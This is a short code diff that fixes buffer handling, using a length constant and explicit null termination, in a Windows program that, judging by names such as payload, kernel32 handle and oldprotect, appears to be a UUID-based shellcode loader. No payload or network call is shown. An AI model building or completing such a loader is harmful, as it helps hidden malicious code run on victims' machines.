@@ -174,7 +174,7 @@ int main(int argc, char *argv[])
 
                 HMODULE k32_handle{GetModuleHandle(k32DllName)};
                 BOOL rv{};
-                char chars_array[39]{};
+                char chars_array[UUID_LINE_LEN]{};
                 DWORD oldprotect{0};
                 char *temp{};
                 printf("1 %s\n", payload);
@@ -186,6 +186,9 @@ int main(int argc, char *argv[])
 
                 for (temp = strtok((char *)payload, "\n"); temp;)
                 {
+                        strncpy(chars_array, temp, UUID_LINE_LEN);
+                        chars_array[UUID_LINE_LEN - 1] = 0x0; // the NULL byte :)
+
 #if DEBUG
                         printf("Sub-string: %s\n\n", chars_array);
 #endif
